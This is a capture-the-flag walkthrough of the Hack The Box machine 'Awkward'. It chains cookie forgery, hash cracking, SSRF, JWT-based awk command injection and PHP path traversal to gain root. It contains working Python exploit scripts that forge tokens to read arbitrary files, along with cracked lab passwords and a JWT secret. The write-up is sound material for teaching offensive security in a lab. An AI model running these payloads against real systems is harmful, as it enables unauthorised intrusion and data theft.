# Enumeration
## NMAP
```
Nmap scan report for 10.129.45.168
Host is up (0.045s latency).
Not shown: 65514 closed tcp ports (conn-refused)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http     nginx 1.18.0 (Ubuntu)
```

There is nothing much to say here, we have just 2 ports open, so let's check the webserver on port 80.

## Webserver

When browsing to webserver using browser, we'd get redirected to `http://hat-valley.htb` so let's add that to `/etc/hosts`. After checking the website, keep proxy open at all times.

After going to `hat-valley.htb`

## Whatweb

Checking the `Whatweb` input, we have nginx/1.18.0, Site is running Express.js, JQuery's version is 3.0.0

## Burp - Site Map

When taking a look at Site map, i've noticed certain cookie ==> `token=guest`. This is something to make a note of!

![picture 6](/assets/images/deb3ee5812d574dee1a14367a2e5bda1365762d6efe0780ad468b8317effa174.png)

store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 33ms]
```

Let's add `store.hat-valley.htb` to `/etc/hosts` and check the website.

![picture 5](/assets/images/c95465b7c4118c599d368eec379c2bfbdffbbf8c84dcb40fe8c30efda89f6f4e.png)  

We need some credentials, which we don't have.

## Linkfinder

I've noticed when i tried to use repeater or simply check the source code of the site, that the webpage would not load as Javascript isn't running.
There is where i thought of `Linkfinder` which checks javascripts for links and routes in the Javascript files.

And it found some interesting pages, indeed.

![picture 7](/assets/images/913c10e3c257c3bae94515dc98aeef530eaadb9777b1105f68d5b2dd042d3525.png)  

So we have `hr`, `api`, `dashboard`,...

## Finding hidden dashboard

`http://hat-valley.htb/hr` presents another login mask.

![picture 8](/assets/images/a075a86d54ee92a67ad638d6e8264efeb67c8091651351f7a60e7902c3a8c271.png)  

What if we change the token from guest to `token=admin`?

![picture 9](/assets/images/82ed0f116f3d51c7059fb5ae22fe90d8fc1e8c33e1df0142f6b48f9f706c661c.png)  

We get in!

We can try to enter a `Leave` but it appears to be a dead end, and requets are ending with `500 Internal Error`.

## Finding passwords

Now again in Burp, new site shows up in the `api` route

![picture 10](/assets/images/74b0cb707ef134398565fe43863866a0f686c2375a48f3d74fc74187444275d4.png)  

It ends with `500 Internal Error` but after sending it to Repeater and removing the cookie, the contents were shown

![picture 11](/assets/images/898f8582ee888d6ec9c36a5426a0bf865dc016acf16ee76242c10009a8db1517.png)  

### Decrypting with Hashcat

Throwing the hashlist into hashcat returned 1 password back
```
hashcat hashes /Users/cm/Projects/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 1400
.......
Dictionary cache hit:
* Filename..: /Users/cm/Projects/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```
So we have credentials for `christopher.jones:chris123`.

## Logging in to HR as christopher.jones

![picture 12](/assets/images/ec5772a960600c05abd587b78e8b20e204ed2fa59b67d9cf02e36565b99a2222.png)  

So christopher's credentials work for HR and we can see below that token was generated.

Again checking the Burp's request, this one stands out:

![picture 14](/assets/images/8364c6149f930c4b980e81c542dda420ba719f8cb79bc502bc7d0a30825de8bc.png)  

# Exploiting Server-Side Request Forgery (SSRF)

If we change the URL with our own, we can clearly see that we have SSRF vulnerability here.

![picture 13](/assets/images/1004c16abecef9b301ccac52abaa3634648c820f6c72c7beae2d7fcd2b239314.png)  

Let'S try to check the open ports on the localhost

```
wfuzz -c -z range,1-10000 --hh 0 -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2NzI2ODEwfQ.zvrc3itkUEVgwgejeHZpsWGq7fEvz-fPUh5uGuVmI9o" 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ/"'
```

![picture 15](/assets/images/486d707b3c0cb0da64c606ce65b47a9a2df490b52703287f556d8237f5aeb2a8.png)  

This looks promising:

![picture 16](/assets/images/060a6fc3c00ede3bef1d2e4f52ecd8d2134e11cfab0eeb8d11e2509696558edd.png)  

## Reading the source code on localhost:3002 (api)

I opened the response in browser for better readability!

![picture 17](/assets/images/13a1ec840fae29d4ed37d411ad133d6e7dd444874c6bcfdfcc4d55acfdbc60f4.png)  

Method that appears interesting and appears to be vulnerable is the `/api/all-leave`. 

![picture 27](/assets/images/fd229d6b8f1c12818f6d7ac415c46fa160b267480ea5d92127374cfe833c6cd8.png)  


User in the token seems to be thrown through Bad-character check, however not all signs appear to be on the blacklist.

```
const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
...
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
...
```

## Crack that JWT

```

```

Apparently takes `token` parameter JWT or HR user, which makes exploitation easier.


I've written simple program that helped me with debugging. It's optional and not really needed, but i'd like to mention that ModeJS / ExpressJS app can get running in 15 Minutes or even less.

```javascript
const express = require('express')
const cookieParser = require("cookie-parser");
const jwt = require("jsonwebtoken");
const exec = require('child_process').exec;
const app = express()
const port = 3000
app.use(cookieParser());
app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.get('/api/all-leave', (req, res) => {

  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  var TOKEN_SECRET="123beany123"

  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }

  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }

  if(!user) {
    return res.status(500).send("Invalid user")
  }

  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }
  console.log("User: " + user)
  console.log("awk '/" + user + "/' /test.csv")
  exec("awk '/" + user + "/' /test.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {

    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }

    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

And exploit script. (Target needs to be modified accordingly, same as payload)

```python
import sys
import requests
import jwt

def jwt_inject_command(target,payload,secret):

	#encoded_jwt = jwt.encode({secret})
	encoded_jwt = jwt.encode({'username': payload}, secret, algorithm='HS256')
	print("Token:" + encoded_jwt)
	cookies={
		'token':encoded_jwt
	}
	r = requests.get(target,cookies=cookies)
	return r

def main():
	if len(sys.argv)!=1:
		print("Usage: SCRIPT URL PAYLOAD")
		sys.exit(1)
	#target = sys.argv[1]
	#payload = sys.argv[2]
	#target = 'http://hat-valley.htb/api/all-leave'
	target= 'http://localhost:3000/api/all-leave'

	# Arbitrary read
	payload = "/' /etc/hostname '/"
	secret="123beany123"

	out = jwt_inject_command(target,payload,secret)
	print(out.text)

if __name__ == '__main__':
	main()
```

![picture 18](/assets/images/7ea35f398e39abd6398fde3263db91f3bbf613ad95ece8a73682dfcde05de978.png)  

Before automating anything, i'll just be trying to leak some useful data, simply by exchanging the path above. E.g., `/var/www/hat-valley.htb/server/server.js` returns with the source code and SQL Credentials.

![picture 19](/assets/images/1f7c3b5317fc94cc1ef0981ec82cbb58a45c4e9f6225bcd485d91daa4f3dc2d7.png)  


### Automate SSRF+LFI using Python
```python
import sys
import requests
import jwt

def jwt_inject_command(target,payload,secret):

	#encoded_jwt = jwt.encode({secret})
	encoded_jwt = jwt.encode({'username': payload}, secret, algorithm='HS256')
	#print("Token:" + encoded_jwt)
	cookies={
		'token':encoded_jwt
	}
	r = requests.get(target,cookies=cookies)
	return r

def main():
	if len(sys.argv)!=1:
		print("Usage: SCRIPT URL PAYLOAD")
		sys.exit(1)
	#target = sys.argv[1]
	#payload = sys.argv[2]
	target = 'http://hat-valley.htb/api/all-leave'
	secret="123beany123"
	#target= 'http://localhost:3000/api/all-leave'
	
	for i in range(100,1000):
		# Arbitrary read
		payload = "/' /proc/{}/cmdline '/".format(i)
		out = jwt_inject_command(target,payload,secret)
		if "Failed" not in (out.text):
			print("Process found => {}:".format(str(i)) + out.text )

if __name__ == '__main__':
	main()
```


`.bashrc` in the `/home/bean`, gives us a clue what we should be searching for.

![picture 20](/assets/images/5608adabcd630b3efe6e716666579165e5ccfc00af43bdadd62b0a55551a6a58.png)  

### Finding backup script
Checking the `/home/bean/Documents/backup_home.sh` it appears that home is being backed up and saved into `.tar.gz`.

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

## Getting shell as Bean
This is the script i've used to download the `tar.gz`

```python
import sys
import requests
import jwt

def jwt_inject_command(target,payload,secret):

	#encoded_jwt = jwt.encode({secret})
	encoded_jwt = jwt.encode({'username': payload}, secret, algorithm='HS256')
	#print("Token:" + encoded_jwt)
	cookies={
		'token':encoded_jwt
	}
	proxies={
		'http': 'http://127.0.0.1:8080'
	}
	r = requests.get(target,cookies=cookies,proxies=proxies,stream=True)
	return r

def main():
	if len(sys.argv)!=1:
		print("Usage: SCRIPT URL PAYLOAD")
		sys.exit(1)

	target = 'http://hat-valley.htb/api/all-leave'
	secret="123beany123"
	payload = "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '/"
	out = jwt_inject_command(target,payload,secret)

	target_path = 'bkp.tar.gz'
	
	if out.status_code == 200:
		with open(target_path, 'wb') as f:
			f.write(out.raw.read())

if __name__ == '__main__':
	main()

```

We need to unpack the `tar.gz` two times, so output should be in the end as seen below.

![picture 21](/assets/images/23270986ddadb9f6374169bc45e80854537e823efd31e9705b1cf19de5a53f98.png)  

Search for `bean` using grep

There we have a file `./.config/xpad/content-DS1ZS1`.

Credentials above work for SSH!

# Privilege Escalation from bean to root

Privilege Escalation is not straightforward at all. We have 2 Users on the box, one is `bean` and other one is `christine`. I wasn't really able to find much files/directories owned by `christine` and no processes.

## PSPY
This looked interesting when running `pspy64s`:

![picture 23](/assets/images/78a62b3afeef63f45ec31fae142f3e0e97318cabd4cdbcd3837349251736cb99.png)  

It runs as root and it triggers when `/var/www/private/leave_requests.csv` changes, which we can control through HR panel!

## Store.hat-valley.htb 

We can login onto `store.hat-valley.htb` using `admin:014mrbeanrules!#P`, which is same password that `bean` has for SSH access on the `Awkward` box.

We can write to two directories:
![picture 28](/assets/images/426760ba9f059fec19cc39fed8934f25c6d2d030171e52ca9780c3193b15253f.png)  

PHP files will not execute:

![picture 30](/assets/images/50bc68f08e42ff185e1c079d12b24df03f16f22c98017af11720549611c945ad.png)  

If we check the script on the backend - e.g., the `cart_actions.php` we would notice that user input goes through `system` call 3 times.

```
bean@awkward:/var/www/store$ grep -rnw . -e "system("
./cart_actions.php:38:            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
./cart_actions.php:40:        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
./cart_actions.php:69:        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
```

The one that we can exploit and make something out of it is the `head -2 .... | tail -1` invocation, by rewriting single line of our chosing. This is possible because we control `item_id` AND the `user_id`.

![picture 24](/assets/images/15af7ffeabd08b18c212cf2424e6b59f6c6883d99cdde7f71102682d37551fc0.png)  

The way we control those values is a little bit strange, but application reads those from files into which we can write, to `cart` and `product-details` as seen few screenshots above.

![picture 31](/assets/images/238d691afe7dcd7890aadc548d2397f07cfd3bd6c664ce63eab1c5e6389802cb.png)  


Blacklist does not stop us from path traversing and adding slashes, dots, dashes. For example like this:

![picture 26](/assets/images/4def1beeb6fab9e207992149695493f86a8503c56d0267cf3a342c4fd87c9610.png)  

We can notice that we've successfully written into a file. (mind the `head` and `tail`, we just append and not rewrite everything).

Observing the pspy64s output, this is the command that fires in the background.

```
sh -c head -2 /var/www/store/product-details/4.txt | tail -1 >> /var/www/store/cart/../../../../../var/www/private/leave_requests.csv
```

We need SSRF again to check the `/var/www/private/leave_results.csv`

![picture 25](/assets/images/5d0c7dcd397825f37fddb803537b13b00e41d2992de9842a48177ad53772e437.png)  

Script use that will be invoked after `inotifywait` fires on modification.
